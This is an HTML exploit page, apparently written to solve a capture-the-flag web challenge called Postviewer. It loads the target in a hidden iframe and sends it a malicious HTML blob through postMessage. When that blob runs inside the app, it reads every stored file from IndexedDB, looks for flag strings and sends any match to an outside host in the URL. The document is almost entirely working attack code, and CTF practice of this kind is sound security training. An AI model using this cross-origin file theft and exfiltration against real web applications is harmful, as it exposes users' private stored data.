<!doctype html>
<meta charset="utf-8">
<script>
(async () => {
  const target = "https://vtqxgb9b-postviewer5.instancer.2025.ctfcompetition.com/";

  // 1) Open Postviewer in iframe
  const f = document.createElement("iframe");
  f.style.display = "none";
  f.src = target;
  document.body.appendChild(f);

  // 2) Malicious file content (runs inside Postviewer)
  const evil = `
<!doctype html><meta charset="utf-8">
<script>
(async () => {
  try {
    const openDB = () => new Promise(r => {
      const q = indexedDB.open("Files", 1);
      q.onsuccess = () => r(q.result);
    });

    const db = await openDB();
    const tx = db.transaction("files", "readonly");
    const store = tx.objectStore("files");
    const req = store.getAll();

    req.onsuccess = async () => {
      for (const e of req.result) {
        if (!e.file) continue;
        const t = await e.file.text();
        if (/CTF\\{|FLAG\\{/i.test(t)) {
          location.href = "https://example.com/#" + encodeURIComponent(t);
          return;
        }
      }
      location.href = "https://example.com/#NO_FLAG";
    };
  } catch (e) {
    location.href = "https://example.com/#ERROR";
  }
})();
<\/script>
`;

  // 3) Send it via broken postMessage
  f.onload = () => {
    f.contentWindow.postMessage({
      type: "share",
      files: [{
        blob: new Blob([evil], { type: "text/html" }),
        name: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        cached: 1
      }]
    }, "*");
  };
})();
</script>
